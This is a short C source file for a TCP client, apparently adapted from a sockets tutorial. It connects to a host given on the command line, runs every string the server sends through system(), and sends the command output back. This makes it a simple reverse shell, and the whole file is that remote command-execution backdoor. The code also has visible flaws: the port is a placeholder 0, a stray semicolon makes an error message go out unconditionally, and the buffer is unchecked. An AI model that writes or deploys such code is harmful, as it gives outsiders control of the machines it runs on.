#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include <arpa/inet.h>

#define PORT "0"

#define MAXDATASIZE 1024

void *get_in_addr(struct sockaddr *sa) {
    if (sa->sa_family ==AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);

    }
    return&(((struct sockaddr_in6*)sa)->sin6_addr);
}

int main (int argc, char *argv[])
{
    int sockfd, numbytes;
    char buf[MAXDATASIZE];
    struct addrinfo hints, *servinfo, *p;
    int rv;
    char s[INET6_ADDRSTRLEN];
    if (argc !=2) {
        fprintf(stderr,"usage: client hostname \n");
        exit(1);
    }
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype=SOCK_STREAM;
    if ((rv = getaddrinfo(argv[1], PORT, &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
        return 1;}
    for (p =servinfo; p!= NULL; p=p->ai_next)
    {
        if ((sockfd =socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1){
            perror("client: socket");
            continue;
        }

        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
            close(sockfd);
            perror("client: connect");
            continue;
        }

            break;
        }
        if (p==NULL) {
            fprintf(stderr, "client: failed to connect\n");
            return 2;

        }
        inet_ntop(p->ai_family, get_in_addr((struct sockaddr *)p->ai_addr), s, sizeof s);
        printf("client: connecting to %s\n",s);
        freeaddrinfo(servinfo); // all done with this structure

        while (1) {
            if ((numbytes=recv(sockfd, buf, MAXDATASIZE-1, 0)) == -1){
                perror("recv");
                exit(1);
            }
            if (numbytes == 0) {
                printf("Connection closed by server\n");
            break;
        }

            buf[numbytes] = '\0';
            
            int error = 0;
            printf("client received %s\n", buf);
            printf("[~] Executing command in progress");
            strcat(buf, " > a.text");
            system(buf);
            
            FILE * fp;
            char * line = NULL;
            size_t len = 0;
            ssize_t read;
            fp = fopen("a.text", "r");

            if (fp==NULL);
            {
                char *error_msg = "Error: no output";
                int len =strlen(error_msg);
                send(sockfd, error_msg, len, 0);
            }
            while ((read=getline(&line, &len, fp)) != -1) {
                send(sockfd, line, strlen(line), 0);
            }
            fclose(fp);
            if (line){free(line);}

        }
        close(sockfd);
        return 0;
}
